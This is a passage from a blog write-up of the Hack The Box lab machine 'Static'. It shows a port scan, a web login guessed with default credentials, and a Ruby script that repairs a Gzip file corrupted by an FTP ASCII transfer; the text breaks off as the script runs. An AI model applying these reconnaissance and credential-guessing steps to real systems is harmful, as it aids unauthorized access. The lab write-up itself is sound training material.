<!doctype html><html lang="es"><head><title>Static | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String"><meta itemprop="description" content="Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String"><meta name="twitter:card" content="Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String"><meta name="twitter:description" content="Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/Static/Static.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Static/Static.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Static/Static.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Static"><meta property="twitter:title" content="Static"><meta property="og:title" content="Static"><meta property="og:url" content="https://7rocky.github.io/en/htb/static/"><meta itemprop="keywords" content="ftp,cve,php,otp,pivoting,capabilities,path-hijacking,port-forwarding,binary-exploitation,format-string,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/static/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/static/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/static/&text=Static" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/static/&title=Static" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Static</h1><time class="mt4 f6 dib tracked" datetime="2021-12-18T00:00:00+01:00">18 / 12 / 2021</time><br><p class="mb4 f6 dib tracked">27 minutes to read</p></header><div class="htb-image"><img alt="Static" src="/images/HTB/Static/Static.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/ftp" title="FTP">FTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/otp" title="OTP">OTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/pivoting" title="Pivoting">Pivoting</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/capabilities" title="Capabilities">Capabilities</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/path-hijacking" title="PATH hijacking">PATH hijacking</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/binary-exploitation" title="Binary exploitation">Binary exploitation</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/format-string" title="Format String vulnerability">Format String vulnerability</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#patching-a-gzip-file">Patching a Gzip file</a></li><li><a href="#handling-2fa">Handling 2FA</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#connection-to-static-vpn">Connection to Static VPN</a></li><li><a href="#exploiting-an-internal-server">Exploiting an internal server</a></li></ul></li><li><a href="#network-enumeration">Network enumeration</a></li><li><a href="#exploiting-another-internal-server">Exploiting another internal server</a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#finding-a-format-string-vulnerability">Finding a Format String vulnerability</a></li><li><a href="#network-setup-for-exploitation">Network setup for exploitation</a></li><li><a href="#format-string-exploitation">Format String exploitation</a></li><li><a href="#privilege-escalation-alternative">Privilege escalation alternative</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.10.246</li><li><strong>Release</strong>: 19 / 06 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.246 -p 22,2222,8080
Nmap scan report for 10.10.10.246
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries
|_/vpn/ /.ftp_uploads/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 27.37 seconds
</code></pre></div><p>This machine has ports 22, 2222 (SSH) and 8080 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.10.246</code> using a web browser, we will see an empty page. Looking at the <code>nmap</code> output, we discover that there is a <code>robots.txt</code> file exposed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.246:8080/robots.txt  
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
</code></pre></div><p>And thus we have two routes to test. The page <code>http://10.10.10.246/vpn</code> shows a simple login form like this one:</p><p><img src="/images/HTB/Static/Static-login.png" alt="Static login"></p><p>Since it is a simple form, we can try some simple credentials. After several attempts, we find that <code>admin:admin</code> works. However, we have to enter a 2FA (Two Factor Authentication) code:</p><p><img src="/images/HTB/Static/Static-2fa.png" alt="Static 2FA"></p><p>Let&rsquo;s leave this for the moment and explore <code>http://10.10.10.246/.ftp_uploads</code>. As it can be seen, directory listing is enabled:</p><p><img src="/images/HTB/Static/Static-ftp-uploads.png" alt="Static FTP uploads"></p><p>The file called <code>warning.txt</code> says the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.246:8080/.ftp_uploads/warning.txt
Binary files are being corrupted during transfer!!! Check if are recoverable.  
</code></pre></div><p>Let&rsquo;s check if it is true. If we download the file <code>db.sql.gz</code> and extract the <code>db.sql</code> file from inside, we will get an error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">7z</span> x <span class="mtku">db.sql.gz</span>

7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs LE)  

Scanning the drive for archives:
1 file, 262 bytes (1 KiB)

Extracting archive: db.sql.gz
--
Path = db.sql.gz
Type = gzip
Headers Size = 17

ERROR: CRC Failed : db.sql

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
</code></pre></div><p>However, <code>7z</code> is able to extract the <code>db.sql</code> file. Nevertheless, it is malformed:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">DATABASE</span><span class="mtk1"> </span><span class="mtk8">static</span><span class="mtk1">;</span>
<span class="mtk5">USE</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1">;</span>
<span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">TABLE</span><span class="mtk1"> </span><span class="mtk8">users</span><span class="mtk1"> ( id </span><span class="mtk7 mtki">smallint</span><span class="mtk1"> unsignint  a</span><span class="mtk4">'n a)Co3 Nto_increment,sers name varchar(20) a'</span><span class="mtk1">n a)Co, </span><span class="mtk5">password</span><span class="mtk1"> </span><span class="mtk7 mtki">varchar</span><span class="mtk1">(</span><span class="mtk6">40</span><span class="mtk1">) a</span><span class="mtk4">'n a)Co, totp varchar(16) a'</span><span class="mtk1">n a)Co, </span><span class="mtk5">primary key</span><span class="mtk1"> (idS iaA;</span>  
<span class="mtk5">INSERT</span><span class="mtk1"> INTOrs ( id smaers </span><span class="mtk5">name</span><span class="mtk1"> vpassword vtotp vaS iayALUESsma, prim</span><span class="mtk4">'admin'</span><span class="mtk1">im</span><span class="mtk4">'d05nade22ae348aeb5660fc2140aec35850c4da997m'</span><span class="mtk1">d0orxxi4c7orxwwzlo</span><span class="mtk4">'</span>
<span class="mtk4">IN</span>
</code></pre></div><p>Therefore, the warning is true. We need to think about how the Gzip file was corrupted.</p><h3 id="patching-a-gzip-file">Patching a Gzip file</h3><p>Since the directory is called <code>.ftp_uploads</code>, maybe the Gzip file was uplaoded using FTP but in ASCII mode and not in binary mode. We discover this issue doing some research on the Internet.</p><p>What happens is that FTP in ASCII mode will change new line characters (<code>\n</code>) to carriage return and new line (<code>\r\n</code>), modifying the file and corrupting it (if it were a text file, no visual changes would be done). The patch is easy: we only need to find <code>\r\n</code> inside the file and replace the matching occurrences with <code>\n</code>.</p><p>If we show the content of the corrupted Gzip file in hexadecimal, we see that there are four occurences of <code>\r\n</code> (in hexadecimal ASCII, <code>\r</code> corresponds to <code>0x0d</code> and <code>\n</code> to <code>0x0a</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> <span class="mtku">db.sql.gz</span>
00000000: 1f8b 0808 ae8b eb5e 0003 6462 2e73 716c  .......^..db.sql  
00000010: 0055 8ec1 6ec2 3010 44ef f98a bd25 9138  .U..n.0.D....%.8
00000020: 84c4 0920 4e86 fa80 84a8 4442 afd5 d676  ... N.....DB...v
00000030: 8bd5 d846 b6d3 40bf be69 a902 9c76 a479  ...F..@..i...v.y
00000040: 333b eb3d a30d 8327 dad0 15ad 19f8 8041  3;.=...'.......A
00000050: f165 74b8 d3eb 2b33 105b 069d 97ce 4302  .et...+3.[....C.
00000060: 4a80 d7d8 b6ca 04e8 8c57 1f46 0d0a 3036  J........W.F..06
00000070: 80e9 da16 b00b f655 19ee a496 264c fe52  .......U....&L.R
00000080: 06b5 842f 74fc 882e c9b3 74a4 2770 42ef  .../t.....t.'pB.
00000090: 7beb c468 9307 3bd8 701a ad69 f590 744a  {..h..;.p..i..tJ
000000a0: a3bb c0a7 bc40 a244 0d0a e912 a2cd ae66  .....@.D.......f
000000b0: fb06 36bb e6f9 6eef 6dc5 ede1 7f77 0d0a  ..6...n.m....w..
000000c0: 2f74 7b60 f5c0 5d6b 6314 5a99 7810 222b  /t{`..]kc.Z.x."+
000000d0: 0d0a 99e7 280b 3247 f956 5655 f6ce f329  ....(.2G.VVU...)
000000e0: c950 f2a2 9c97 1927 0217 8bd9 2f6b ddf9  .P.....'..../k..
000000f0: ac08 9f0d b7ef bf5b 1b0f 6ba2 e807 eaf0  .......[..k.....
00000100: 78b0 6301 0000                           x.c...

<span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> <span class="mtku">db.sql.gz</span> | <span class="code-dark-green">grep</span> -o 0d0a
<span class="code-red">0d0a</span>
<span class="code-red">0d0a</span>
<span class="code-red">0d0a</span>
<span class="code-red">0d0a</span>
</code></pre></div><p>To patch the Gzip file, I decided to use a simple Ruby script that downloads the file, takes the contents, replaces every occurrence of <code>\r\n</code> by <code>\n</code> and outputs it to a file. Then we can decompress the patched file without errors. This can be done in the same Ruby script with a few lines:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env ruby</span>

<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'uri'</span>
<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'zlib'</span>

<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'net/http'</span>

<span class="mtk1">sql_file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'db.sql'</span>
<span class="mtk1">gz_file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk5">#{</span><span class="mtk1">sql_file</span><span class="mtk5">}</span><span class="mtk4">.gz"</span>
<span class="mtk1">tmp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"tmp_</span><span class="mtk5">#{</span><span class="mtk1">gz_file</span><span class="mtk5">}</span><span class="mtk4">"</span>
<span class="mtk1">host </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'10.10.10.246:8080'</span>

<span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">"[*] Downloading corrupted </span><span class="mtk5">#{</span><span class="mtk1">gz_file</span><span class="mtk5">}</span><span class="mtk4"> file"</span>

<span class="mtk1">url </span><span class="mtk5">=</span><span class="mtk1"> URI(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://</span><span class="mtk5 detected-link">#{</span><span class="mtk1 detected-link">host</span><span class="mtk5 detected-link">}</span><span class="mtk4 detected-link">/.ftp_uploads/</span><span class="mtk5 detected-link">#{</span><span class="mtk1 detected-link">gz_file</span><span class="mtk5 detected-link">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Net</span><span class="mtk1">::</span><span class="mtk7 mtki">HTTP</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(url)</span>
<span class="mtk7 mtki">File</span><span class="mtk1">.</span><span class="mtk8">binwrite</span><span class="mtk1">(gz_file, res)</span>

<span class="mtk7 mtki">File</span><span class="mtk1">.</span><span class="mtk7">open</span><span class="mtk1">(gz_file, </span><span class="mtk4">'rb'</span><span class="mtk1">) { |f| </span><span class="mtk7 mtki">File</span><span class="mtk1">.</span><span class="mtk8">binwrite</span><span class="mtk1">(tmp, f.</span><span class="mtk8">read</span><span class="mtk1">.</span><span class="mtk7">gsub</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\r\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)) }</span>  

<span class="mtk7 mtki">Zlib</span><span class="mtk1">::</span><span class="mtk7 mtki">GzipReader</span><span class="mtk1">.</span><span class="mtk7">open</span><span class="mtk1">(tmp) </span><span class="mtk5">do</span><span class="mtk1"> |f|</span>
<span class="mtk1">  sql </span><span class="mtk5">=</span><span class="mtk1"> f.</span><span class="mtk8">read</span><span class="mtk1">.</span><span class="mtk8">strip</span>
<span class="mtk1">  </span><span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">"[+] Patched </span><span class="mtk5">#{</span><span class="mtk1">gz_file</span><span class="mtk5">}</span><span class="mtk4"> file. Found </span><span class="mtk5">#{</span><span class="mtk1">sql_file</span><span class="mtk5">}</span><span class="mtk4">:</span><span class="mtk6">\n\n</span><span class="mtk5">#{</span><span class="mtk1">sql</span><span class="mtk5">}</span><span class="mtk4">"</span>

<span class="mtk1">  </span><span class="mtk7 mtki">File</span><span class="mtk1">.</span><span class="mtk7">open</span><span class="mtk1">(sql_file, </span><span class="mtk4">'w'</span><span class="mtk1">) { |ff| ff.</span><span class="mtk8">write</span><span class="mtk1">(sql) }</span>
<span class="mtk5">end</span>
</code></pre></div><p>Now we execute the script and get the <code>db.sql</code> file as is:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> <span class="mtku">patch_gz.rb</span>
[*] Downloading corrupted db.sql.gz file
[+] Patched db.sql.gz file. Found db.sql:  
